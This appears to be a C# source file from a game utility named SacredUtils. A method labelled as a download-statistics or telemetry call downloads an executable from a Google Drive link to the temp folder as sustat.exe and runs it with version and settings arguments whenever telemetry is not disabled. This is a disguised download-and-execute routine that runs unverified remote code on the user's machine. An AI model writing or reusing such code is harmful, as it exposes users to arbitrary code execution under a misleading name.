using System;
using System.Diagnostics;
using System.Net;

namespace SacredUtils.resources.bin
{
    public static class GetApplicationDownloadStatistic
    {
        public static void Get()
        {
            if (!AppSettings.ApplicationSettings.DisableTelemetry)
            {
                if (CheckAvailabilityInternetConnection.Connect())
                {
                    try
                    {
                        WebClient wc = new WebClient();

                        wc.DownloadFileTaskAsync(
                            "https://drive.google.com/uc?export=download&id=1zgsMglsGJNptUdLCyfZ_znAygF0waT4b",
                            $"{Environment.ExpandEnvironmentVariables("%tmp%")}\\sustat.exe").Wait();

                        Process.Start($"{Environment.ExpandEnvironmentVariables("%tmp%")}\\sustat.exe",
                            $"{AppSummary.Version} {AppSettings.ApplicationSettings.DisableTelemetry.ToString().ToLower()} {AppSettings.ApplicationSettings.WhatIsThisDoingHere.ToString().ToLower()}");

                        AppSettings.ApplicationSettings.WhatIsThisDoingHere = false;
                    }
                    catch (Exception ex)
                    {
                        AppLogger.Log.Error(ex.ToString);
                    }
                }
            }
        }
    }
}
